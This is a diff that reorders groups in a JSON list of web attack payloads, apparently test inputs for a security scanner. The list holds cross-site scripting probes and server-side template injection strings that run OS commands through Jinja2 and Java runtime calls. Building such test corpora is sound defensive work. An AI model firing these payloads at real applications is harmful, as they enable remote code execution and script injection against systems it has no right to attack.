@@ -6,10 +6,11 @@
     "#{7*7}}",
     "<%= 7*7 %>"
   ],
-  "ssti_introspection": [
-    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
-    "${T(java.lang.Runtime).getRuntime().exec('id')}",
-    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+  "context_escape": [
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "'-alert(1)-'",
+    "\"; alert(1); //"
   ],
   "script_injection": [
     "<script>alert(1)</script>",
@@ -17,10 +18,9 @@
     "<img src=x onerror=alert(1)>",
     "<svg onload=alert(1)>"
   ],
-  "context_escape": [
-    "javascript:alert(1)",
-    "data:text/html,<script>alert(1)</script>",
-    "'-alert(1)-'",
-    "\"; alert(1); //"
+  "ssti_introspection": [
+    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+    "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
   ]
 }
